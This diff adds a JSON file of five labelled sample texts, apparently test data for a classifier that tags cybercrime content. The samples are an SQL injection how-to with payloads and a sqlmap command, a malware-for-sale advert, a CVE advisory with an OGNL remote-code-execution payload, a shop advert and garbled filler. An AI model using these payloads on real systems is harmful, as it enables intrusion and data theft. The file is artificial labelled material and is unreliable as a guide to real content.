@@ -1,0 +1,32 @@
+[
+  {
+    "id": "doc_001",
+    "text": "🔥 ULTIMATE SQL INJECTION GUIDE 2025 🔥\n\nBros, here's the full breakdown on how to pwn login forms using SQLi.\n\nStep 1: Find a target with a login page. Use Google dorks like: inurl:login.php\nStep 2: Try basic payloads: ' OR 1=1 -- , admin' --, ' UNION SELECT null,null --\nStep 3: If WAF blocks you, use tamper scripts with sqlmap:\n  sqlmap -u \"http://target.com/login\" --tamper=space2comment --dbs\nStep 4: Dump the database, extract admin creds.\nStep 5: Use hashcat or john to crack password hashes.\n\nTools: sqlmap, Burp Suite, hashcat, john the ripper\n\nDM me for private 1-on-1 tutorials. $50/session. Escrow accepted.\n\nStay safe, use VPN + Tor. OPSEC is key.",
+    "ground_truth_relevancy": "Relevant",
+    "ground_truth_category": "Hack"
+  },
+  {
+    "id": "doc_002",
+    "text": "💀 SELLING PREMIUM RAT + KEYLOGGER BUNDLE 💀\n\nFeatures:\n- Full remote access trojan (RAT) with HVNC (Hidden VNC)\n- Built-in keylogger with clipboard capture\n- Browser credential stealer (Chrome, Firefox, Edge)\n- Crypto wallet drainer module\n- FUD (Fully Undetectable) — bypasses Windows Defender, Kaspersky, Malwarebytes\n- Persistence via registry + scheduled tasks\n- C2 panel with Telegram bot integration\n\nPricing:\n- RAT only: $200\n- Full bundle (RAT + Keylogger + Stealer): $450\n- Lifetime updates: $100 extra\n\nPayment: BTC, XMR, LTC\n\nProof of work available. DM with \"RAT2025\" for samples.\n\n⚠️ For educational purposes only. Not responsible for misuse.",
+    "ground_truth_relevancy": "Relevant",
+    "ground_truth_category": "Malware"
+  },
+  {
+    "id": "doc_003",
+    "text": "CVE-2025-29013 — Critical RCE in Apache Struts\n\nA critical remote code execution vulnerability has been discovered in Apache Struts versions 2.5.0 through 2.5.33. The flaw exists in the OGNL expression evaluation within the ActionMapper component.\n\nImpact: An unauthenticated attacker can execute arbitrary commands on the server by sending a crafted HTTP request with a malicious Content-Type header.\n\nCVSS Score: 9.8 (Critical)\n\nAffected Versions: Apache Struts 2.5.0 - 2.5.33\nFixed Version: Apache Struts 2.5.34\n\nExploit PoC:\nPOST /struts2-showcase/ HTTP/1.1\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}\n\nMitigation: Upgrade immediately. If upgrade is not possible, apply the official workaround by disabling dynamic method invocation.\n\nReferences:\n- https://struts.apache.org/announce-2025\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29013",
+    "ground_truth_relevancy": "Relevant",
+    "ground_truth_category": "Vulnerability"
+  },
+  {
+    "id": "doc_004",
+    "text": "🌟 BEST DEALS ON ELECTRONICS — SPRING SALE 2025 🌟\n\nCheck out our amazing deals!\n\n📱 iPhone 15 Pro Max — $899 (was $1199)\n💻 MacBook Air M3 — $999 (was $1299)\n🎧 AirPods Pro 2 — $189 (was $249)\n📺 Samsung 65\" 4K OLED — $1299 (was $1799)\n\nFree shipping on orders over $50!\nUse code SPRING25 for additional 10% off.\n\nVisit our store: www.techdeals-store.com\nCustomer support: support@techdeals-store.com\n\n⭐ Over 50,000 happy customers!\n⭐ 30-day money back guarantee\n⭐ 2-year warranty included\n\nDon't miss out — sale ends March 15th!",
+    "ground_truth_relevancy": "Not Relevant",
+    "ground_truth_category": "N/A"
+  },
+  {
+    "id": "doc_005",
+    "text": "asd lk;jasd f09823 lkjasdf\n\n<html><body><div class=\"err\">50 3 — Serv er Err or</div>\n\n????? broken cont ent h ere\n\nnull null null undef ined\n\n<script>var x = {{TEMPLATE_ERROR}};</script>\n\n404 page n ot foun d. Plea se try aga in la ter.\n\nGarbage text: ñ@#$%^&*()_+= ∂ƒ©˙∆˚¬…æ\n\nCached content from 2019-01-01. This page may be outdated or no longer available.",
+    "ground_truth_relevancy": "Not Relevant",
+    "ground_truth_category": "N/A"
+  }
+]
